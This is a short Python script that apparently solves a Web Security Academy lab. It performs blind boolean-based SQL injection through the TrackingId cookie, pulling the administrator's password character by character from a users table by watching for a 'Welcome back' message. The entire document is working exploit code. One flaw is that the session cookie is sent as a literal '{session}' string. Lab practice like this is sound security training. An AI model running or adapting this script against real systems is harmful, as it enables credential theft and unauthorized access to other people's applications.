import requests

url = 'https://0a71005903179da880ef58290024002e.web-security-academy.net/filter?category=Gifts'
trackingId = 'WRZcL3blKj8g33lD'
session = 'nL2y3jQS7RGGszFBzSetHZfPfGPrOgOq'

alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
            "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

password = ""
password_length = 20

while len(password) < password_length:
    position = len(password) + 1
    for alp in alphabet: 
        payload = f"{trackingId}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{alp}"
        request = requests.get(url, cookies = {"TrackingId": payload, "session": "{session}"} )
        if "Welcome back" in request.text:
            password = password + alp
            print(alp)
            break

print(password)